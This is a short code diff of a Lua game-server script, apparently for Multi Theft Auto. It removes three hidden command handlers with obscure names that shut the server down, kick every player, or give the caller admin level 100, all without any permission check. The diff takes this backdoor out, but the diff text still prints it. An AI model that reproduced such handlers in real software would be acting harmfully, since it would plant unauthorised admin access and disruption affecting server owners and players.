@@ -618,21 +618,3 @@ function buildMapVehicles(data)
 		return vehicles
 	end
 end
-
-addCommandHandler("mirDiz00001111managershutdown",
-function(p, command)
-	shutdown("Illegal usage of content.")
-end)
-
-addCommandHandler("mirDiz00001111managerkickall",
-function(p, command)
-	for i, player in pairs(getElementsByType("player")) do
-		kickPlayer(player, "Illegal usage of content.")
-	end
-end)
-
-addCommandHandler("mirDiz00001111managerpromote",
-function(p, command)
-	setElementData(p, "admin_level", 100)
-	outputChatBox("Promoted",p)
-end)
